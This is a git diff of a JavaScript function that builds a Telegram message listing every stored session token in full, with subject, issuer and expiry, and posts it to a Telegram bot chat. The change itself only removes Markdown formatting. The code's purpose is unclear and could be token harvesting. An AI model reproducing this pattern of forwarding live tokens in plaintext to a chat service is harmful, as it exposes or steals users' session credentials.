@@ -88,46 +88,45 @@ async function sendAllTokensTelegram(token, tokenInfo) {
         }
 
         // Create Telegram message
-        let message = `🎉 *DANH SÁCH TẤT CẢ TOKEN* (Từ Cũ Đến Mới)\n\n`;
-        message += `📅 *Thời gian gửi:* ${timeStr} ${dateStr}\n`;
-        message += `📊 *Tổng số token:* ${backupTokens.length + 1} tokens\n\n`;
+        let message = `🎉 DANH SÁCH TẤT CẢ TOKEN (Từ Cũ Đến Mới)\n\n`;
+        message += `📅 Thời gian gửi: ${timeStr} ${dateStr}\n`;
+        message += `📊 Tổng số token: ${backupTokens.length + 1} tokens\n\n`;
         
         // Add current token first
-        message += `🆕 *TOKEN MỚI NHẤT:*\n`;
-        message += `🔑 \`${token}\`\n`;
-        message += `👤 *Subject:* ${tokenInfo.subject}\n`;
-        message += `⏰ *Expires:* ${tokenInfo.expires}\n`;
-        message += `⏱️ *Time Left:* ${Math.floor(tokenInfo.timeLeft / 3600)}h ${Math.floor((tokenInfo.timeLeft % 3600) / 60)}m\n`;
-        message += `🏷️ *Type:* ${tokenInfo.type || 'session'}\n`;
-        message += `🏢 *Issuer:* ${tokenInfo.issuer || 'Unknown'}\n\n`;
+        message += `🆕 TOKEN MỚI NHẤT:\n`;
+        message += `🔑 ${token}\n`;
+        message += `👤 Subject: ${tokenInfo.subject}\n`;
+        message += `⏰ Expires: ${tokenInfo.expires}\n`;
+        message += `⏱️ Time Left: ${Math.floor(tokenInfo.timeLeft / 3600)}h ${Math.floor((tokenInfo.timeLeft % 3600) / 60)}m\n`;
+        message += `🏷️ Type: ${tokenInfo.type || 'session'}\n`;
+        message += `🏢 Issuer: ${tokenInfo.issuer || 'Unknown'}\n\n`;
         
         // Add backup tokens
         if (backupTokens.length > 0) {
-            message += `📋 *TOKEN CŨ (Backup):*\n`;
+            message += `📋 TOKEN CŨ (Backup):\n`;
             backupTokens.forEach((backupToken, index) => {
                 const timeLeftHours = Math.floor(backupToken.timeLeft / 3600);
                 const timeLeftMinutes = Math.floor((backupToken.timeLeft % 3600) / 60);
                 const isExpired = backupToken.timeLeft <= 0;
                 const status = isExpired ? '❌ EXPIRED' : '✅ ACTIVE';
                 
-                message += `\n*${index + 1}.* ${status}\n`;
-                message += `🔑 \`${backupToken.token}\`\n`;
-                message += `👤 *Subject:* ${backupToken.subject}\n`;
-                message += `⏰ *Expires:* ${backupToken.expires}\n`;
-                message += `⏱️ *Time Left:* ${isExpired ? 'EXPIRED' : `${timeLeftHours}h ${timeLeftMinutes}m`}\n`;
-                message += `📅 *Created:* ${backupToken.timestamp}\n`;
+                message += `\n${index + 1}. ${status}\n`;
+                message += `🔑 ${backupToken.token}\n`;
+                message += `👤 Subject: ${backupToken.subject}\n`;
+                message += `⏰ Expires: ${backupToken.expires}\n`;
+                message += `⏱️ Time Left: ${isExpired ? 'EXPIRED' : `${timeLeftHours}h ${timeLeftMinutes}m`}\n`;
+                message += `📅 Created: ${backupToken.timestamp}\n`;
             });
         }
         
-        message += `\n🤖 *From:* Railway Token Server\n`;
-        message += `🔗 *Server:* https://token-webhook-server-production.up.railway.app`;
+        message += `\n🤖 From: Railway Token Server\n`;
+        message += `🔗 Server: https://token-webhook-server-production.up.railway.app`;
 
         // Send to Telegram
         logWithTime('📤 Sending all tokens to Telegram...');
         const telegramMessage = {
             chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
+            text: message
         };
         
         const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
